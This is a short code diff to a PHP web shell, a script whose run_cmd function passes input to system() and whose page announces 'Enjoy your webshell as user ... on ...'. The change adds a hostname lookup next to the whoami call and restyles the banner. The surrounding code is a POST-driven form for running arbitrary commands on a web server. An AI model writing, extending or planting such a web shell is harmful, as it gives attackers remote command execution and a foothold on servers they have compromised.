@@ -12,7 +12,8 @@ function run_cmd($cmd) {
 	system($cmd);
 	return ob_get_clean();
 }
-$user = run_cmd('whoami'); // Get shell user
+$user = run_cmd('whoami');
+$hostname = run_cmd('hostname');
 
 // Basic checks for form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -32,7 +33,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 }
 // Show username
-echo "<h2>Enjoy your webshell as user <span style='font-style: italic; font-weight: bold;'>$user</span></h2>";
+echo "<h2>Enjoy your webshell as user <span style='color: blue;'>$user</span> on <span style='color: blue;'>$hostname</span></h2>";
 ?>
 
 <form method="post" id="cmd_form" action="">
